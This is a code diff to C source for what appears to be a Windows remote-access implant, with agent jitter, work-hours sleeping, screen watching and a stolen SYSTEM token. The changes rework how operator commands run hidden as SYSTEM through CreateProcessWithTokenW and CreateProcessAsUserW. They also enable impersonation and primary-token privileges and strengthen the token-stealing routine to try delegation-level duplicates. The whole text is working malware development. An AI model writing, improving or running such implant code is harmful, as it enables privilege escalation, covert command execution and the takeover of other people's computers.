@@ -38,6 +38,9 @@ int g_jitter_pct = AGENT_JITTER_PCT;
 // ── SYSTEM primary token (stored by getsystem, used by run_shell) ────────────
 static HANDLE g_system_token = NULL;
 
+/* Declared here because the shell path runs before the token helpers below. */
+static int enable_privilege(HANDLE hToken, const char *priv_name);
+
 // ── Screenwatch globals ────────────────────────────────────────────────────────
 static volatile int g_sw_stop = 1;
 static long long    g_sw_task_id = 0;
@@ -76,210 +79,27 @@ void sleep_until_work_hours(void) {
 
 // ── Shell execution ───────────────────────────────────────────────────────────
 
-static void shell_cleanup_files(const char *out_file, const char *script_file,
-                                const char *script_tmp) {
-    if (out_file && out_file[0]) DeleteFileA(out_file);
-    if (script_file && script_file[0]) DeleteFileA(script_file);
-    if (script_tmp && script_tmp[0]) DeleteFileA(script_tmp);
-}
-
-/* Last-resort capture path for systems where the token process was created
- * but its standard handles were not connected.  Put the command in a real
- * .cmd file and launch that file as SYSTEM.  This avoids relying on /c's
- * quote/redirection grammar and avoids inheriting any local-user handles. */
-static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
-                                       DWORD as_user_err) {
-    char out_file[MAX_PATH] = {0};
-    char script_tmp[MAX_PATH] = {0};
-    char script_file[MAX_PATH] = {0};
-    if (!GetTempFileNameA("C:\\Users\\Public", "egx", 0, out_file)) {
-        char *e = (char*)malloc(128);
-        if (as_user_err) {
-            snprintf(e, 128, "[error: CreateProcessAsUserW %lu; temp file %lu]",
-                     as_user_err, GetLastError());
-        } else {
-            snprintf(e, 128, "[error: shell capture temp file %lu]", GetLastError());
-        }
-        return e;
-    }
-
-    if (!GetTempFileNameA("C:\\Users\\Public", "egs", 0, script_tmp)) {
-        DWORD err = GetLastError();
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        char *e = (char*)malloc(128);
-        snprintf(e, 128, "[error: shell script temp file %lu]", err);
-        return e;
-    }
-    int script_path_len = snprintf(script_file, sizeof(script_file),
-                                   "%s.cmd", script_tmp);
-    if (script_path_len < 0 || (size_t)script_path_len >= sizeof(script_file)) {
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        return strdup("[error: shell script path too long]");
-    }
-    /* GetTempFileName creates script_tmp; rename it to a .cmd extension so
-       cmd.exe executes it as a batch script rather than treating it as data. */
-    DeleteFileA(script_file);
-    if (!MoveFileA(script_tmp, script_file)) {
-        DWORD err = GetLastError();
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        char *e = (char*)malloc(128);
-        snprintf(e, 128, "[error: shell script rename %lu]", err);
-        return e;
-    }
-    script_tmp[0] = '\0';
-
-    FILE *sf = fopen(script_file, "wb");
-    if (!sf) {
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        return strdup("[error: shell script create]");
-    }
-    int script_len = fprintf(sf,
-        "@echo off\r\n(\r\n%s\r\n) > \"%s\" 2>&1\r\n", cmd, out_file);
-    int script_bad = (script_len < 0 || ferror(sf));
-    fclose(sf);
-    if (script_bad) {
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        return strdup("[error: shell script write]");
-    }
-
-    char file_cmd[4608];
-    int cmd_len = snprintf(file_cmd, sizeof(file_cmd),
-        "cmd.exe /d /c call \"%s\"", script_file);
-    if (cmd_len < 0 || (size_t)cmd_len >= sizeof(file_cmd)) {
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        return strdup("[error: shell command too long]");
-    }
-
-    wchar_t wcmd[4608];
-    if (MultiByteToWideChar(CP_ACP, 0, file_cmd, -1, wcmd,
-                            (int)(sizeof(wcmd) / sizeof(wcmd[0]))) <= 0) {
-        DWORD err = GetLastError();
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        char *e = (char*)malloc(128);
-        snprintf(e, 128, "[error: shell command encoding %lu]", err);
-        return e;
-    }
-
-    if (!CreateProcessWithTokenW) {
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        return strdup("[error: CreateProcessWithTokenW unavailable]");
-    }
-
-    STARTUPINFOW si = {0};
-    si.cb = sizeof(si);
-    PROCESS_INFORMATION pi = {0};
-    BOOL imp_ok = ImpersonateLoggedOnUser(hSysTok);
-    DWORD imp_err = GetLastError();
-    BOOL proc_ok = FALSE;
-    DWORD proc_err = 0;
-    if (imp_ok) {
-        /* Supplying the application path avoids the NULL-application-name
-         * command-line token search and guarantees that the SYSTEM process
-         * starts the real cmd.exe. */
-        static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
-        proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wcmd,
-            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        proc_err = GetLastError();
-        RevertToSelf();
-    }
-    if (!imp_ok) {
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        char *e = (char*)malloc(128);
-        snprintf(e, 128,
-                 "[error: CreateProcessAsUserW %lu; ImpersonateLoggedOnUser %lu]",
-                 as_user_err, imp_err);
-        return e;
-    }
-    if (!proc_ok) {
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        char *e = (char*)malloc(128);
-        if (as_user_err) {
-            snprintf(e, 128,
-                     "[error: CreateProcessAsUserW %lu; CreateProcessWithTokenW %lu]",
-                     as_user_err, proc_err);
-        } else {
-            snprintf(e, 128, "[error: CreateProcessWithTokenW %lu]", proc_err);
-        }
-        return e;
-    }
-
-    DWORD wait = WaitForSingleObject(pi.hProcess, 60000);
-    if (wait == WAIT_TIMEOUT) {
-        TerminateProcess(pi.hProcess, 1);
-        WaitForSingleObject(pi.hProcess, 2000);
-    } else if (wait == WAIT_FAILED) {
-        DWORD wait_err = GetLastError();
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        char *e = (char*)malloc(128);
-        snprintf(e, 128, "[error: shell capture wait %lu]", wait_err);
-        return e;
-    }
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-    FILE *f = fopen(out_file, "rb");
-    if (!f) {
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        return strdup("[error: shell capture file unavailable]");
-    }
-    size_t cap = 4096, len = 0;
-    char *buf = (char*)malloc(cap);
-    if (!buf) {
-        fclose(f);
-        shell_cleanup_files(out_file, script_file, script_tmp);
-        return strdup("[oom]");
-    }
-    DWORD nr = 0;
-    char tmp[512];
-    while ((nr = (DWORD)fread(tmp, 1, sizeof(tmp), f)) > 0) {
-        if (len + nr + 1 >= cap) {
-            cap = (len + nr) * 2 + 1024;
-            char *nb = (char*)realloc(buf, cap);
-            if (!nb) {
-                free(buf);
-                fclose(f);
-                shell_cleanup_files(out_file, script_file, script_tmp);
-                return strdup("[oom]");
-            }
-            buf = nb;
-        }
-        memcpy(buf + len, tmp, nr);
-        len += nr;
-    }
-    fclose(f);
-    shell_cleanup_files(out_file, script_file, script_tmp);
-    buf[len] = '\0';
-    if (len == 0) {
-        free(buf);
-        if (as_user_err) {
-            char *e = (char*)malloc(160);
-            snprintf(e, 160,
-                     "[error: CreateProcessAsUserW %lu; SYSTEM shell wrapper output empty]",
-                     as_user_err);
-            return e;
-        }
-        return strdup("[error: SYSTEM shell wrapper output empty]");
-    }
-    return buf;
-}
-
 static char* run_shell(const char *cmd) {
     char full_cmd[4096];
+    char shell_args[4096];
     /* /s has quote-stripping rules that are surprising when redirection is
        appended after the quoted command.  Let /c consume the remainder
        directly and disable AutoRun so the result is deterministic. */
-    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /d /c %s 2>&1", cmd);
+    int args_len = snprintf(shell_args, sizeof(shell_args), "/d /c %s 2>&1", cmd);
+    if (args_len < 0 || (size_t)args_len >= sizeof(shell_args)) {
+        return strdup("[error: shell command too long]");
+    }
+    int full_len = snprintf(full_cmd, sizeof(full_cmd), "cmd.exe %s", shell_args);
+    if (full_len < 0 || (size_t)full_len >= sizeof(full_cmd)) {
+        return strdup("[error: shell command too long]");
+    }
 
     HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
         (PVOID*)&g_system_token, NULL, NULL);
     if (hSysTok) {
-        /* Prefer CreateProcessAsUserW with bInheritHandles=TRUE so the
-           anonymous pipe is duplicated normally.  A filtered local-admin
-           token can make that call fail with 1314; the code below retries
-           CreateProcessWithTokenW against the same pipe before using the
-           file-based compatibility path. */
+        /* Use a real inherited pipe and a primary-token process launch.  The
+           token API is attempted first, followed by CreateProcessAsUserW;
+           neither path needs a temporary batch/file redirection wrapper. */
         HANDLE hRead = NULL, hWrite = NULL;
         SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
         if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
@@ -295,74 +115,107 @@ static char* run_shell(const char *cmd) {
             return e;
         }
 
-        wchar_t wcmd[4096];
-        if (MultiByteToWideChar(CP_ACP, 0, full_cmd, -1, wcmd,
-                                (int)(sizeof(wcmd) / sizeof(wcmd[0]))) <= 0) {
+        wchar_t wargs_token[4096];
+        wchar_t wargs_as_user[4096];
+        if (MultiByteToWideChar(CP_ACP, 0, shell_args, -1, wargs_token,
+                                (int)(sizeof(wargs_token) / sizeof(wargs_token[0]))) <= 0) {
             DWORD err = GetLastError();
             CloseHandle(hRead); CloseHandle(hWrite);
             char *e = (char*)malloc(96);
             snprintf(e, 96, "[error: command encoding %lu]", err);
             return e;
         }
-        /* CreateProcess* may insert a terminator into lpCommandLine. Keep a
-           pristine copy for the CreateProcessWithTokenW retry. */
-        wchar_t wcmd_token[4096];
-        memcpy(wcmd_token, wcmd, sizeof(wcmd_token));
+        /* Every CreateProcess* variant may modify its command-line buffer. */
+        memcpy(wargs_as_user, wargs_token, sizeof(wargs_as_user));
 
         STARTUPINFOW si = {0};
         si.cb        = sizeof(si);
-        si.dwFlags   = STARTF_USESTDHANDLES;
+        si.dwFlags   = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
         si.hStdInput = NULL;
         si.hStdOutput = hWrite;
         si.hStdError  = hWrite;
         PROCESS_INFORMATION pi = {0};
 
-        BOOL imp_ok = ImpersonateLoggedOnUser(hSysTok);
-        DWORD imp_err = GetLastError();
+        static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
+        static const wchar_t cmd_cwd[] = L"C:\\Windows\\System32";
+        /* Match the mature implementations: enable the privilege used by
+           CreateProcessWithTokenW on the caller and on the duplicated token,
+           then launch with the token directly.  Impersonation is only a last
+           retry because changing the thread token before CreateProcess* can
+           make a filtered local-admin token report 1314. */
+        HANDLE hSelf = NULL;
+        if (OpenProcessToken(GetCurrentProcess(),
+                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelf)) {
+            enable_privilege(hSelf, "SeImpersonatePrivilege");
+            enable_privilege(hSelf, "SeIncreaseQuotaPrivilege");
+            enable_privilege(hSelf, "SeAssignPrimaryTokenPrivilege");
+            CloseHandle(hSelf);
+        }
+        enable_privilege(hSysTok, "SeImpersonatePrivilege");
+        enable_privilege(hSysTok, "SeIncreaseQuotaPrivilege");
+        enable_privilege(hSysTok, "SeAssignPrimaryTokenPrivilege");
+
         BOOL proc_ok = FALSE;
-        DWORD proc_err = 0;
-        DWORD as_user_err = 0;
-        if (imp_ok) {
-            if (CreateProcessAsUserW) {
-                proc_ok = CreateProcessAsUserW(hSysTok, NULL, wcmd,
-                    NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-                proc_err = GetLastError();
-                as_user_err = proc_ok ? 0 : proc_err;
+        DWORD with_token_err = CreateProcessWithTokenW ? ERROR_GEN_FAILURE : ERROR_PROC_NOT_FOUND;
+        DWORD as_user_err = CreateProcessAsUserW ? ERROR_GEN_FAILURE : ERROR_PROC_NOT_FOUND;
+        DWORD imp_err = 0;
+
+        /* CreateProcessWithTokenW copies STARTF_USESTDHANDLES unchanged and
+           does not require the caller to hold SeIncreaseQuotaPrivilege. */
+        if (CreateProcessWithTokenW) {
+            proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs_token,
+                CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
+            if (proc_ok) {
+                with_token_err = 0;
             } else {
-                proc_err = ERROR_PROC_NOT_FOUND;
-                as_user_err = proc_err;
+                with_token_err = GetLastError();
             }
-            /* CreateProcessWithTokenW copies STARTF_USESTDHANDLES values
-               unchanged.  Use the same pipe when CreateProcessAsUserW is
-               blocked by SeIncreaseQuota/SeAssignPrimaryToken (1314); this
-               avoids the lossy cmd.exe-to-temp-file redirection fallback. */
-            if (!proc_ok && CreateProcessWithTokenW) {
-                static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
-                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wcmd_token,
-                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-                proc_err = GetLastError();
-                if (proc_ok) proc_err = 0;
+        }
+
+        /* Keep the documented fallback for tokens/environments where the
+           caller has SeIncreaseQuota/SeAssignPrimaryToken but not
+           SeImpersonate.  Use a fresh buffer because the first call is
+           allowed to modify lpCommandLine. */
+        if (!proc_ok && CreateProcessAsUserW) {
+            proc_ok = CreateProcessAsUserW(hSysTok, cmd_app, wargs_as_user,
+                NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
+            if (proc_ok) {
+                as_user_err = 0;
+            } else {
+                as_user_err = GetLastError();
             }
-            RevertToSelf();
+        }
+
+        /* A process that only has an impersonation privilege in the SYSTEM
+           token can still satisfy CreateProcessWithTokenW after a temporary
+           impersonation.  This is deliberately the last retry and the thread
+           is reverted immediately afterwards. */
+        if (!proc_ok && CreateProcessWithTokenW) {
+            BOOL imp_ok = ImpersonateLoggedOnUser(hSysTok);
+            if (!imp_ok) {
+                imp_err = GetLastError();
+            } else {
+                wchar_t wargs_retry[4096];
+                memcpy(wargs_retry, wargs_token, sizeof(wargs_retry));
+                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs_retry,
+                    CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
+                if (proc_ok) {
+                    with_token_err = 0;
+                } else {
+                    with_token_err = GetLastError();
+                }
+                RevertToSelf();
+            }
         }
         CloseHandle(hWrite);
 
-        if (!imp_ok) {
-            CloseHandle(hRead);
-            char *e = (char*)malloc(96);
-            snprintf(e, 96, "[error: ImpersonateLoggedOnUser %lu]", imp_err);
-            return e;
-        }
         if (!proc_ok) {
             CloseHandle(hRead);
-            char *e = (char*)malloc(160);
-            if (as_user_err && proc_err) {
-                snprintf(e, 160,
-                         "[error: CreateProcessAsUserW %lu; CreateProcessWithTokenW %lu]",
-                         as_user_err, proc_err);
-            } else {
-                snprintf(e, 160, "[error: SYSTEM shell launch %lu]", proc_err);
-            }
+            char *e = (char*)malloc(192);
+            snprintf(e, 192,
+                     "[error: SYSTEM shell launch; WithToken=%lu; AsUser=%lu; Impersonate=%lu]",
+                     with_token_err, as_user_err, imp_err);
             return e;
         }
 
@@ -378,6 +231,8 @@ static char* run_shell(const char *cmd) {
            holding the write end open.  Reading concurrently also avoids the
            anonymous-pipe buffer deadlock for commands with large output. */
         DWORD started = GetTickCount();
+        DWORD child_exit = STILL_ACTIVE;
+        DWORD child_exit_err = 0;
         BOOL timed_out = FALSE;
         for (;;) {
             DWORD avail = 0, nr = 0;
@@ -398,8 +253,10 @@ static char* run_shell(const char *cmd) {
             }
 
             DWORD exit_code = STILL_ACTIVE;
-            if (!GetExitCodeProcess(pi.hProcess, &exit_code) ||
-                exit_code != STILL_ACTIVE) {
+            if (!GetExitCodeProcess(pi.hProcess, &exit_code)) {
+                child_exit_err = GetLastError();
+            } else if (exit_code != STILL_ACTIVE) {
+                child_exit = exit_code;
                 /* One final drain after process termination. */
                 while (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                     char tmp[512];
@@ -424,23 +281,21 @@ static char* run_shell(const char *cmd) {
             Sleep(10);
         }
 
-        /* Some Windows configurations report CreateProcessAsUserW success
-           but do not connect the inherited stdout handle.  Retry through the
-           command-line redirection path when a normally-outputting command
-           produced an empty body; keep the timeout result from being retried. */
-        if (len == 0 && !timed_out) {
-            CloseHandle(hRead);
-            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            free(buf);
-            return run_shell_with_token_file(cmd, hSysTok, as_user_err);
-        }
-
         buf[len] = '\0';
         CloseHandle(hRead);
         CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
         if (len == 0 && timed_out) {
             free(buf);
             return strdup("[error: SYSTEM shell capture timed out]");
+        }
+        if (len == 0) {
+            free(buf);
+            char *e = (char*)malloc(192);
+            snprintf(e, 192,
+                     "[error: SYSTEM shell capture empty; exit=%lu; exit_error=%lu; WithToken=%lu; AsUser=%lu]",
+                     (unsigned long)child_exit, (unsigned long)child_exit_err,
+                     (unsigned long)with_token_err, (unsigned long)as_user_err);
+            return e;
         }
         return buf;
     }
@@ -1250,7 +1105,8 @@ static int enable_privilege(HANDLE hToken, const char *priv_name) {
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Luid = luid;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) ? 1 : 0;
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) return 0;
+    return GetLastError() == ERROR_SUCCESS ? 1 : 0;
 }
 
 static char *token_steal(int pid) {
@@ -1304,11 +1160,21 @@ static char *gs_try_steal(DWORD pid, const char *name) {
     HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (!hProc) return NULL;
     HANDLE hTok = NULL;
-    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)) { CloseHandle(hProc); return NULL; }
+    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
+        CloseHandle(hProc);
+        return NULL;
+    }
     CloseHandle(hProc);
     HANDLE hPrim = NULL, hDup = NULL;
-    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary,      &hPrim);
-    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup);
+    /* A delegation-level duplicate is what the mature token-launch paths
+       try first; older/filtered tokens may only permit impersonation. */
+    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
+                          SecurityDelegation, TokenPrimary, &hPrim)) {
+        DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
+                         SecurityImpersonation, TokenPrimary, &hPrim);
+    }
+    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
+                     SecurityImpersonation, TokenImpersonation, &hDup);
     CloseHandle(hTok);
     if (!hPrim || !hDup) {
         if (hPrim) CloseHandle(hPrim);
